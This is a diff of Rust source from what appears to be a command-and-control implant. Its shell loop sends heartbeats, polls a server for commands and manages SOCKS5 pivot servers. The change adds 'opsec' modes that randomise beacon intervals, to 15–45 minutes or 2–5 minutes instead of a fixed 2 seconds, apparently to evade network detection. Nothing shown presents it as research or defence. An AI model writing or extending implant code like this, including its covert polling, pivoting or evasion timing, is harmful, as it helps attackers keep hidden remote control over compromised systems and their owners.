@@ -1,27 +1,28 @@
-use std::io;
-use std::process::Command;
-use std::path::Path;
-use serde_json::json;
-use hostname;
-use os_info;
-use std::env;
-use get_if_addrs::get_if_addrs;
-use tokio::time::timeout;
-use std::time::{Duration}; // commented out SystemTime, UNIX_EPOCH
-use reqwest::StatusCode;
-use crate::networking::egress::get_egress_ip;
 use crate::config::AgentConfig;
-use log::{info, error, debug};
-use std::collections::HashMap;
-use tokio::task::JoinHandle;
-use once_cell::sync::Lazy;
-use tokio::sync::Mutex as TokioMutex;
-use crate::networking::socks5_pivot_server::Socks5PivotServer;
+use crate::networking::egress::get_egress_ip;
 use crate::networking::socks5_pivot::Socks5PivotHandler;
-use tokio::sync::mpsc;
+use crate::networking::socks5_pivot_server::Socks5PivotServer;
+use crate::opsec::{OPSEC_STATE, AgentMode, determine_agent_mode};
+use crate::util::random_jitter;
+use get_if_addrs::get_if_addrs;
+use hostname;
+use log::{info, error, debug};
+use once_cell::sync::Lazy;
+use os_info;
+use reqwest::StatusCode;
+use serde_json::json;
+use std::collections::HashMap;
+use std::env;
+use std::io;
+use std::path::Path;
+use std::process::Command;
 use std::sync::Arc;
-use crate::opsec::{OPSEC_STATE, AgentMode};
 use std::sync::Mutex;
+use std::time::{Duration}; // commented out SystemTime, UNIX_EPOCH
+use tokio::sync::Mutex as TokioMutex;
+use tokio::sync::mpsc;
+use tokio::task::JoinHandle;
+use tokio::time::timeout;
 
 
 static PIVOT_SERVERS: Lazy<TokioMutex<HashMap<u16, JoinHandle<()>>>> = Lazy::new(|| TokioMutex::new(HashMap::new()));
@@ -229,12 +230,19 @@ pub async fn run_shell(
     agent_id: &str,
     pivot_handler: Arc<TokioMutex<Socks5PivotHandler>>,
     pivot_tx: mpsc::Sender<crate::networking::socks5_pivot::PivotFrame>,
-    ) -> io::Result<()> {
+    ) -> Result<(), Box<dyn std::error::Error>> {
         let config = AgentConfig::load()?;
         info!("[SHELL] Starting shell with agent ID: {}", agent_id);
         send_heartbeat_with_client(&config, server_addr, agent_id).await?;
         
         loop {
+            let mode = determine_agent_mode();
+            let (base, jitter) = match mode {
+                AgentMode::FullOpsec => (900, 1800),         // 15–45 min
+                AgentMode::BackgroundOpsec => (120, 180),     // 2–5 min
+            };
+            let sleep_time = random_jitter(base, jitter);
+
             info!("[SHELL] Polling for commands...");
             match get_command_with_client(&config, server_addr, agent_id).await? {
                 Some(command) => {
@@ -282,7 +290,7 @@ pub async fn run_shell(
                     }
                 }
                 None => {
-                    tokio::time::sleep(Duration::from_secs(2)).await;
+                    tokio::time::sleep(Duration::from_secs(sleep_time)).await;
                 }
             }
         }
